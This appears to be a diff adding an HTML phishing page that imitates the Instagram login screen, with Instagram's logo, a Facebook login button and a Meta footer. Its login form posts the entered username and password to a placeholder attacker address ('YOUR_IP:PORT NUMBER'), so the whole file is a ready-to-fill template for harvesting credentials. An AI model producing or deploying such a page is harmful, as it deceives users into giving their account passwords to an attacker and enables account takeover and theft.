@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram • Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="bg-[#fafafa] min-h-screen flex flex-col items-center justify-center pt-8 pb-8 font-[system-ui]">
+  <div class="flex flex-col items-center w-full max-w-[350px] mb-10">
+    <!-- Main Login Container -->
+    <div class="bg-white border border-gray-300 px-10 py-4 w-full mb-2.5">
+      <!-- Instagram Logo -->
+      <div class="flex justify-center mb-8 mt-9">
+        <!-- Instagram Logo SVG -->
+        <img src="../assets/instagram.png" alt="Instagram" class="h-[82px] mt-2 mb-4">
+      </div>
+      
+      <!-- Login Form -->
+      <form class="flex flex-col gap-[6px] mt-6" method="POST" action="http://YOUR_IP:PORT NUMBER/login">
+        <div class="w-full">
+          <input type="text" name="username"placeholder="Phone number, username, or email" class="w-full text-xs px-2 py-[9px] border border-gray-300 rounded-[3px] bg-[#fafafa] focus:outline-none focus:border-gray-400">
+        </div>
+        <div class="w-full">
+          <input type="password" name="password"placeholder="Password" class="w-full text-xs px-2 py-[9px] border border-gray-300 rounded-[3px] bg-[#fafafa] focus:outline-none focus:border-gray-400">
+        </div>
+        <div class="w-full mt-2">
+          <button type="submit" class="w-full bg-[#0095f6] text-white py-[5px] rounded text-sm font-semibold cursor-pointer opacity-70 hover:opacity-100 transition mt-2">Log in</button>
+        </div>
+        
+        <div class="flex items-center gap-4 my-4">
+          <div class="flex-1 h-[1px] bg-gray-300"></div>
+          <span class="text-gray-500 font-semibold text-[13px] text-center">OR</span>
+          <div class="flex-1 h-[1px] bg-gray-300"></div>
+        </div>
+        
+        <!-- Facebook Login -->
+        <div class="flex justify-center mt-2">
+          <button class="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm">
+            <img src="../assets/facebook.svg" alt="Facebook" class="h-6 w-6">
+            <span>Log in with Facebook</span>
+          </button>
+        </div>
+        
+        <!-- Forgot Password -->
+        <div class="text-center mt-4 mb-6">
+          <a href="#" class="text-[#00376b] text-xs">Forgot password?</a>
+        </div>
+      </form>
+    </div>
+    
+    <!-- Sign Up Section -->
+    <div class="bg-white border border-gray-300 w-full py-[18px] text-sm text-center">
+      <span class="text-[14px]">
+        Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a>
+      </span>
+    </div>
+    
+    <!-- Get the app -->
+    <div class="text-center mt-4">
+      <p class="text-sm mb-4">Get the app.</p>
+      <div class="flex justify-center gap-4">
+        <a href="#" class="h-10">
+          <img src="../assets/appstore.svg" alt="App Store" class="h-16">
+        </a>
+        <a href="#" class="h-10">
+          <img src="../assets/playstore.svg" alt="Google Play" class="h-16">
+        </a>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Footer -->
+  <footer class="w-full max-w-[350px] mx-auto text-center text-xs text-gray-500 mt-6">
+    <div class="flex flex-wrap justify-center gap-x-4 gap-y-3 mb-4">
+      <a href="#" class="text-xs text-gray-500">Meta</a>
+      <a href="#" class="text-xs text-gray-500">About</a>
+      <a href="#" class="text-xs text-gray-500">Blog</a>
+      <a href="#" class="text-xs text-gray-500">Jobs</a>
+      <a href="#" class="text-xs text-gray-500">Help</a>
+      <a href="#" class="text-xs text-gray-500">API</a>
+      <a href="#" class="text-xs text-gray-500">Privacy</a>
+      <a href="#" class="text-xs text-gray-500">Terms</a>
+      <a href="#" class="text-xs text-gray-500">Top Accounts</a>
+      <a href="#" class="text-xs text-gray-500">Locations</a>
+      <a href="#" class="text-xs text-gray-500">Instagram Lite</a>
+      <a href="#" class="text-xs text-gray-500">Threads</a>
+    </div>
+    <div class="flex justify-center items-center gap-4 mt-4 mb-12">
+      <select class="bg-transparent text-xs text-gray-500 outline-none">
+        <option value="en">English</option>
+        <option value="es">Español</option>
+        <option value="fr">Français</option>
+      </select>
+      <span>© 2025 Instagram from Meta</span>
+    </div>
+  </footer>
+</body>
+</html>
